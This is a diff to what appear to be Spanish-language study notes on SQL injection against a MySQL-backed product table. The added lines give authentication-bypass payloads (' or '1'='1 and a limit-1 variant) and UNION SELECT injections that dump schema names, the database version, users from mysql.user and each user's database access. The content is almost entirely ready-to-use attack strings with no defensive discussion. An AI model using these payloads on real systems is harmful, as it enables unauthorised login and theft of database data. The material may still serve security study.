@@ -1,5 +1,39 @@
 //Bypass login 
 
+->Cuando solo hay un usuario 
+    ' or '1'='1
+
+->Cuando hay multiples usuarios 
+
+    ' or '1'='1' limit 1  #'a
+
+//Filtar esquemas 
+
+    select *from PRODUCTO where NOMBRE_P = 'nombre'  union
+    select null as a, null as b, null as c, schema_name
+    from information_schema.schemata #'a'  
+
+select *from PRODUCTO where NOMBRE_P = 'nombre'  union 
+ select null,version(),null,null #'a' 
+
+//Mostrar datos usuarios/roles 
+
+->Mostrar los usuarios de la base de datos 
+    select *from PRODUCTO where NOMBRE_P = 'sadf'  union
+    select  null as a, null as b, null as c,  User from mysql.user #'a'  
+
+->mostrar los usuarios y a que base de datos tienen acceso
+
+select *from PRODUCTO where NOMBRE_P = 'sadf'  union
+select u.User,Db,null as a, null as b from mysql.user u,mysql.db d; #'a'
+
+
+//Mostrar version de la base de datos 
+
+select *from PRODUCTO where NOMBRE_P = 'nombre'  union 
+ select null,version(),null,null #'a'
+
+
 
 
 
@@ -24,11 +58,6 @@ order by schema_name;
 
 
 
-
-//filtar esquemas 
-select *from PRODUCTO where NOMBRE_P = 'nombre'  union
-select null as a, null as b, null as c, schema_name
-from information_schema.schemata #'a'  
 
 //mostrar tablas 
 select *from PRODUCTO where NOMBRE_P = 'nombre' union
